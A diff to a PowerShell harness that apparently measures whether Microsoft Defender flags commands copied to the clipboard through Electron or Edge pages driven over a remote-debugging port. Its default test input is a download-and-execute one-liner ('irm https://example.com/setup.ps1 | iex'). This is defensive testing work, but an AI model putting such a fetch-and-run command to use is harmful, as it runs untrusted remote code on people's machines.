@@ -8,7 +8,8 @@ param(
   [int]$Wait = 25,
   [string]$Text = 'irm https://example.com/setup.ps1 | iex'
 )
-$ErrorActionPreference = 'Stop'
+$ErrorActionPreference = 'Continue'
+$node = (Get-Command node).Source
 $here = $PSScriptRoot
 $urls = @{ zip = 'https://citadel.zip/'; other = 'https://cara.apps.webplatformisbestplatform.net/c/' }
 $dir = Join-Path $env:LOCALAPPDATA 'defender-copy'
@@ -20,7 +21,7 @@ if (-not (Test-Path $electron)) {
   finally { Pop-Location }
 }
 $edge = @("${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe", "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe") | Where-Object { Test-Path $_ } | Select-Object -First 1
-"electron $(& $electron --version) · node $(node --version) · Defender $((Get-MpComputerStatus).AntivirusSignatureVersion)"
+"electron $(& $electron --version) - node $(& $node --version) - Defender $((Get-MpComputerStatus).AntivirusSignatureVersion)"
 
 function Detections { @(Get-MpThreatDetection -ErrorAction SilentlyContinue) }
 $all = Detections
@@ -33,17 +34,17 @@ foreach ($case in $Cases) {
   $prof = Join-Path $env:TEMP "defender-copy-$port"
   $since = Get-Date
   if ($kind -eq 'electron') {
-    $p = Start-Process $electron -ArgumentList "--remote-debugging-port=$port", "`"$here\electron-main.js`"", $url -PassThru
+    $p = Start-Process $electron -ArgumentList "--remote-debugging-port=$port", "`"$here\electron-main.cjs`"", $url -PassThru
   } else {
     $p = Start-Process $edge -ArgumentList "--remote-debugging-port=$port", "--user-data-dir=`"$prof`"", '--no-first-run', '--no-default-browser-check', '--new-window', $url -PassThru
   }
   Set-Clipboard -Value 'cleared'
-  & node "$here\copy.mjs" $port $Text | ForEach-Object { "  $_" }
+  & $node "$here\copy.mjs" $port $Text | ForEach-Object { "  $_" }
   Start-Sleep -Seconds $Wait
   $clip = (Get-Clipboard -Raw) -replace '\s+$', ''
   $new = @(Detections | Where-Object { $_.InitialDetectionTime -ge $since.AddSeconds(-2) })
-  "$case ($url): clipboard '$clip' · new detections: $($new.Count)"
-  foreach ($d in $new) { "  DETECTED ThreatID $($d.ThreatID) at $($d.InitialDetectionTime) process $($d.ProcessName) · $($d.Resources -join '; ')" }
+  "$case ($url): clipboard '$clip' - new detections: $($new.Count)"
+  foreach ($d in $new) { "  DETECTED ThreatID $($d.ThreatID) at $($d.InitialDetectionTime) process $($d.ProcessName) - $($d.Resources -join '; ')" }
   # Edge leaves helper processes behind its first one: stop every process started from this case's profile or exe.
   Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -and ($_.CommandLine.Contains("--remote-debugging-port=$port") -or $_.CommandLine.Contains($prof)) } |
     ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
